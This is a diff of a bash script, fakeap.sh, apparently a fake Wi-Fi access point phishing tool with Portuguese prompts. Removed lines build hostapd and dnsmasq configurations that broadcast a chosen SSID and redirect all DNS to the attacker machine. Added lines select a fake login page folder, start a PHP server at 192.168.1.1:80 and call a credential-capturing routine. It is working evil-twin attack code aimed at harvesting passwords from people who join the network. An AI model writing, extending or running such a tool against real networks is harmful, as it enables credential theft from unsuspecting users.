@@ -83,63 +83,37 @@ start() {
     rm -rf credentials.txt
   fi
 
-  interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)
+  if [ ! -d "sites" ]; then
+    mkdir sites
+  fi
 
   counter=1
-  for i in $(cat iface); do
-    printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $i
+  for i in sites/*/; do
+    printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter "$(basename "$i")"
     let counter++
   done
 
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface to use:\e[0m ' use_interface
-  choosed_interface=$(sed ''$use_interface'q;d' iface)
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma pasta:\e[0m ' chosen_folder
+  chosen_folder=$(sed -n "${chosen_folder}p" <(ls -d sites/*/))
+
+  if [ -z "$chosen_folder" ]; then
+    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Pasta inválida.\n"
+    exit 1
+  fi
+
+  interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)
+
   IFS=$'\n'
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID to use:\e[0m ' use_ssid
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Channel to use:\e[0m ' use_channel
-  list_folders
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Fake page number to use:\e[0m ' fake_page_number
-  fake_page=$(sed ''$fake_page_number'q;d' folders)
-  createpage
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\e[0m\n" 
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID a ser usado:\e[0m ' use_ssid
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Canal a ser usado:\e[0m ' use_channel
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Página de login (Padrão: login.php): \e[0m' login_page
+  login_page="${login_page:-login.php}"
+  createpage "$chosen_folder"
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Finalizado: ./fakeap.sh --stop\n"
+  printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor php...\n"
+  php -S 192.168.1.1:80 > /dev/null 2>&1 & 
   sleep 2
-  killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
-  sleep 5
-  printf "interface=%s\n" $choosed_interface > hostapd.conf
-  printf "driver=nl80211\n" >> hostapd.conf
-  printf "ssid=%s\n" $use_ssid >> hostapd.conf
-  printf "hw_mode=g\n" >> hostapd.conf
-  printf "channel=%s\n" $use_channel >> hostapd.conf
-  printf "macaddr_acl=0\n" >> hostapd.conf
-  printf "auth_algs=1\n" >> hostapd.conf
-  printf "ignore_broadcast_ssid=0\n" >> hostapd.conf
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" $choosed_interface 
-  ifconfig $choosed_interface down
-  sleep 4
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Setting %s to monitor mode\n" $choosed_interface
-  iwconfig $choosed_interface mode monitor
-  sleep 4
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Up\n" $choosed_interface 
-  ifconfig wlan0 up
-  sleep 5
-  hostapd hostapd.conf > /dev/null 2>&1 &
-  sleep 6
-  printf "interface=%s\n" $choosed_interface > dnsmasq.conf
-  printf "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
-  printf "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
-  printf "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
-  printf "server=8.8.8.8\n" >> dnsmasq.conf
-  printf "log-queries\n" >> dnsmasq.conf
-  printf "log-dhcp\n" >> dnsmasq.conf
-  printf "listen-address=127.0.0.1\n" >> dnsmasq.conf
-  printf "address=/#/192.168.1.1\n" >> dnsmasq.conf
-  ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
-  sleep 1
-  route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
-  sleep 1
-  dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
-  sleep 5
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] To Stop: ./fakeap.sh --stop\n"
-  sudo bash fakeap.sh --server
+  getcredentials
 }
 
 catch_cred() {
